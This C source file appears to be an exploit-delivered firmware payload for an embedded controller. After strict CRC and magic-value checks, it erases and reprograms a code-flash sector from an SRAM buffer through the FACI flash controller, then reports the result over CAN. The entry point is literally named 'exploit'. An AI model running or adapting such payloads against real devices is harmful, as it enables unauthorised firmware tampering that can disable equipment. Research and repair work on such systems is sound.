#define RESTORE_SECTOR_PAYLOAD 1
#include "patch_common.h"
#include "faci_dual.h"

#define TARGET_SECTOR_BASE 0x00060000u
#define CRC_SECTOR_BASE 0x000F8000u
#define TARGET_INSTRUCTION_OFFSET 0x64E4u
#define SOURCE_ADJUST_OFFSET 0x7DECu
#define CRC_MAGIC_OFFSET 0x7E00u
#define INTENT_MAGIC 0x52535452u
#define INTENT_SCHEMA 1u
#define INTENT_LENGTH 0x80u
#define INTENT_CRC_OFFSET 48u

struct restore_intent {
  uint32_t magic;
  uint16_t schema;
  uint16_t length;
  uint32_t sector_base;
  uint8_t backup_sha256[32];
  uint8_t instruction_or_magic[4];
  uint32_t crc32;
} __attribute__((packed));
struct restore_storage {
  struct restore_intent intent;
  uint8_t source_adjustment[4];
  uint32_t staged_crc32;
  uint8_t reserved[68];
} __attribute__((packed));
const volatile struct restore_storage restore_intent_block
  __attribute__((section(".intent"),used))={0};
typedef char intent_size_check[sizeof(struct restore_intent)==52u?1:-1];
typedef char storage_size_check[sizeof(struct restore_storage)==INTENT_LENGTH?1:-1];

static uint32_t intent_crc(void){
  const volatile uint8_t *p=(const volatile uint8_t *)&restore_intent_block;
  uint32_t crc=0xFFFFFFFFu,i;
  for(i=0u;i<INTENT_LENGTH;++i){
    uint8_t value=(i>=INTENT_CRC_OFFSET&&i<INTENT_CRC_OFFSET+4u)?0u:p[i];
    crc=crc32_update(crc,value);
  }
  return crc^0xFFFFFFFFu;
}
static int equal4(const volatile uint8_t *a,const volatile uint8_t *b){uint8_t d=0u;uint32_t i;for(i=0u;i<4u;++i)d|=a[i]^b[i];return d==0u;}
static uint32_t staged_crc32(const volatile uint8_t *data,const struct runtime_guard *guard){
  uint32_t crc=0xFFFFFFFFu,i;for(i=0u;i<TARGET_LENGTH;++i){crc=crc32_update(crc,data[i]);if((i&0x7FFu)==0u)feed_watchdog(guard);}return crc^0xFFFFFFFFu;
}
static int validate_restore_intent(const struct runtime_guard *guard){
  const volatile struct restore_intent *intent=&restore_intent_block.intent;
  static const uint8_t instruction[4]={0x20u,0xE6u,0x31u,0x00u};
  static const uint8_t magic[4]={0x5Au,0xA5u,0xA5u,0x5Au};
  uint32_t i;
  if(intent->magic!=INTENT_MAGIC||intent->schema!=INTENT_SCHEMA||intent->length!=INTENT_LENGTH||intent_crc()!=intent->crc32)return 1;
  if(intent->sector_base!=TARGET_SECTOR_BASE&&intent->sector_base!=CRC_SECTOR_BASE)return 2;
  for(i=0u;i<68u;++i)if(restore_intent_block.reserved[i]!=0u)return 3;
  if(staged_crc32(SRAM_BUFFER,guard)!=restore_intent_block.staged_crc32)return 4;
  if(intent->sector_base==TARGET_SECTOR_BASE){
    if(!equal4(intent->instruction_or_magic,instruction)||!equal4(SRAM_BUFFER+TARGET_INSTRUCTION_OFFSET,instruction))return 5;
    for(i=0u;i<4u;++i)if(restore_intent_block.source_adjustment[i]!=0u)return 6;
  }else{
    if(!equal4(intent->instruction_or_magic,magic)||!equal4(SRAM_BUFFER+CRC_MAGIC_OFFSET,magic)
      ||!equal4(SRAM_BUFFER+SOURCE_ADJUST_OFFSET,restore_intent_block.source_adjustment))return 7;
  }
  return 0;
}
static void send_restore_result(const volatile uint8_t *sector,const uint32_t codes[6],const struct runtime_guard *guard){
  uint32_t crc,stage,base=restore_intent_block.intent.sector_base;
  (void)can_send(PROTO_BEGIN0|(PROTO_VERSION<<8)|((uint32_t)PROTO_OP_RESTORE_SECTOR<<16),base,guard);
  (void)can_send(PROTO_BEGIN1|(PROTO_VERSION<<8)|((uint32_t)PROTO_OP_RESTORE_SECTOR<<16)|(1u<<24),TARGET_LENGTH,guard);
  if(stream_sector(sector,guard,&crc)!=0)return;
  (void)send_magic(0u,MMIO32(MAGIC0_ADDRESS),guard);(void)send_magic(1u,MMIO32(MAGIC1_ADDRESS),guard);
  for(stage=0u;stage<6u;++stage)(void)can_send(PROTO_STATUS|((stage+1u)<<8),codes[stage],guard);
  (void)can_send(PROTO_END,crc,guard);
}
static void restore_exploit(void)__attribute__((noinline,noreturn));
static void restore_exploit(void){
  struct runtime_guard guard;struct faci_snapshot entry,exit;
  uint32_t codes[6];uint32_t failed_page=0u,stage;int error;
  const volatile struct restore_intent *intent=&restore_intent_block.intent;
  for(stage=0u;stage<6u;++stage)codes[stage]=0u;
  __asm__ volatile("di");runtime_begin(&guard);
  error=validate_restore_intent(&guard);if(error!=0){(void)can_send(PROTO_ERROR|(1u<<8),(uint32_t)error,&guard);goto halt;}
  take_faci_snapshot(&entry);if(!exact_idle(&entry)){codes[0]=8u;goto readback;}
  error=enter_pe(&guard);if(error!=0){codes[1]=(uint32_t)error;codes[4]=(uint32_t)failure_cleanup(&guard);goto readback;}
  error=erase_sector(intent->sector_base,&guard);if(error!=0){codes[2]=(uint32_t)error;codes[4]=(uint32_t)failure_cleanup(&guard);goto readback;}
  error=program_sector(intent->sector_base,SRAM_BUFFER,&failed_page,&guard);
  if(error!=0){codes[3]=(failed_page<<16)|(uint32_t)error;codes[4]=(uint32_t)failure_cleanup(&guard);goto readback;}
  error=exit_pe(&guard);take_faci_snapshot(&exit);if(error!=0||!exact_idle(&exit))codes[4]=(uint32_t)(error!=0?error:4);
readback:send_restore_result((const volatile uint8_t *)intent->sector_base,codes,&guard);
halt:runtime_end(&guard);for(;;){}
}
void exploit(void)__attribute__((section(".text.entry"),used,noreturn));
void exploit(void){restore_exploit();}
